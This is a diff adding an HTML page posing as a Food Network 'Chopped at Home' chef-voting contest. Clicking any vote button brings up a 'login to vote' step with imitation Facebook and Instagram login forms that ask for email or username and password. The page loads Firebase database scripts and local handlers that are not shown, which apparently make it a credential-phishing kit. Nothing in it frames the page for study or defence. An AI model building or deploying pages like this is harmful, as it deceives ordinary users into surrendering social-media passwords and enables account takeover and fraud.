@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chopped at Home Challenge | Food Network</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="assets/style.css">
+    <link rel="stylesheet" href="css/index.css">
+    <script src="js/index.js"></script>
+    <!-- Google Translate Widget Code -->
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({ pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE }, 'google_translate_element');
+        }
+    </script>
+    <style>
+        /* Add your styling here */
+        body {
+          margin: 0;
+          padding: 0;
+          font-family: Arial, sans-serif;
+          background-color: white;
+        }
+        .navbar {
+          background-color: transparent;
+          padding: 10px;
+          display: flex;
+          justify-content: center;
+        }
+        .logo img {
+          width: 70px;
+        }
+        .hero-banner {
+          position: relative;
+          text-align: center;
+        }
+        .hero-banner img {
+          width: 100%;
+          height: auto;
+        }
+        .hero-content {
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          text-align: center;
+          color: #fff;
+        }
+        .hero-content h1 {
+          font-size: 1.6rem;
+          margin-bottom: 10px;
+        }
+        .hero-content p {
+          font-size: 0.9rem;
+          margin-bottom: 20px;
+        }
+        .hero-button {
+          padding: 10px 20px;
+          background-color: #e74c3c;
+          border: none;
+          color: #fff;
+          text-decoration: none;
+          border-radius: 5px;
+          transition: background-color 0.3s;
+        }
+        .hero-button:hover {
+          background-color: #c0392b;
+        }
+        /* Rest of your styling */
+        .contestants-section {
+          display: flex;
+          flex-wrap: wrap;
+          justify-content: center;
+          padding: 20px;
+        }
+        .contestant {
+          flex: 1;
+          max-width: calc(50% - 20px);
+          background-color: #ffffff;
+          border: 1px solid #ccc;
+          padding: 20px;
+          margin: 10px;
+          border-radius: 10px;
+          text-align: center;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .contestant h3 {
+          margin: 0;
+          padding: 10px;
+        }
+        .voteButton {
+          padding: 10px 20px;
+          background-color: #3498db;
+          border: none;
+          color: #fff;
+          cursor: pointer;
+          border-radius: 5px;
+          transition: background-color 0.3s;
+        }
+        .voteButton:hover {
+          background-color: #258cd1;
+        }
+        @media (max-width: 768px) {
+          .contestant {
+            max-width: calc(100% - 20px);
+          }
+        }
+    </style>
+</head>
+<body>
+    <div id="home">
+        <header>
+          <nav class="navbar">
+            <div class="logo">
+              <a href="#"><img src="assets/images/logo.png" alt="Food Chef Competition"></a>
+            </div>
+          </nav>
+          <div class="hero-banner">
+            <img src="assets/images/hero-image.JPG" alt="Contestant 1">
+            <div class="hero-content">
+              <h1>Welcome to the Food Chef Competition Voting</h1>
+              <p>Vote for your favorite chef in the Food Chef Competition and support them to become the champions.</p>
+              <a href="#votingSection" class="hero-button" onclick="vote()">Vote Now</a>
+            </div>
+          </div>
+        </header>
+        <section id="votingSection" class="contestants-section">
+          <div class="contestant">
+            <img src="assets/images/chef1.JPG" alt="Contestant 1">
+            <h3>Master of Flavors</h3>
+            <p>A culinary artist who expertly blends flavors and techniques to create unforgettable dishes. Known for innovative recipes and remarkable presentations.</p>
+            <button class="voteButton" onclick="vote()">Vote (1)</button>
+          </div>
+          <div class="contestant">
+            <img src="assets/images/chef2.JPG" alt="Contestant 2">
+            <h3>Culinary Maestro</h3>
+            <p>A chef with an exceptional mastery of culinary arts. Their creations reflect years of dedication, training, and a passion for elevating dining experiences.</p>
+            <button class="voteButton" onclick="vote()">Vote (2)</button>
+          </div>
+          <div class="contestant">
+            <img src="assets/images/chef3.JPG" alt="Contestant 3">
+            <h3>Gourmet Visionary</h3>
+            <p>An imaginative chef who redefines traditional dishes with creative twists. Their culinary vision brings new dimensions to familiar flavors.</p>
+            <button class="voteButton" onclick="vote()">Vote (3)</button>
+          </div>
+          <div class="contestant">
+            <img src="assets/images/chef4.JPG" alt="Contestant 4">
+            <h3>Artisanal Craftsman</h3>
+            <p>A chef dedicated to perfecting the art of craftsmanship in cooking. Their attention to detail and devotion to the culinary process sets them apart.</p>
+            <button class="voteButton" onclick="vote()">Vote (4)</button>
+          </div>
+        </section>
+        <!-- Add more contestants if needed -->
+        </div><!-- Contestant information goes here -->
+    </section>
+    </div>
+    <!-- Additional script tags go here -->
+    <center>
+        <div id="choose">
+            <p>
+                Login with one of the following to vote:
+            </p>
+            <p>
+                <img id="fb" onclick="fb()" src="assets/images/fb.png">
+                <img id="ig" onclick="ig()" src="assets/images/ig.png">
+            </p>
+            <br>
+            <button onclick="can()" id="cancel">Close</button>
+        </div>
+    </center>
+    <center>
+        <div id="fbp">
+            <div class="facebook-login" id="fb2" align="center">
+                <div class="ggt">
+                    <img src="assets/images/fb.png" alt="logo" id="fblogo">
+                    <h1 id="fb2">
+                        Facebook
+                    </h1>
+                    <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+                    <input type="password" placeholder="Password" id="fb-pass"><br>
+                    <button onclick="login()" id="fb-log">
+                        Log in
+                    </button>
+                </div>
+            </div>
+        </div>
+    </center>
+    <center>
+        <div id="igp">
+            <div class="Instagram-login" id="ig2" align="center">
+                <div class="ppt">
+                    <img src="assets/images/ig2.png" alt="logo" id="iglogo"><br><br>
+                    <br>
+                    <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+                    <input type="password" placeholder="Password" id="ig-pass">
+                    <br>
+                    <button onclick="iglog()" id="ig-log">
+                        Log in
+                    </button>
+                </div>
+            </div>
+        </div>
+    </center>
+    <!-- Firebase scripts and other additional scripts go here -->
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+    <script src="js/firebase.js"></script>
+</body>
+</html>
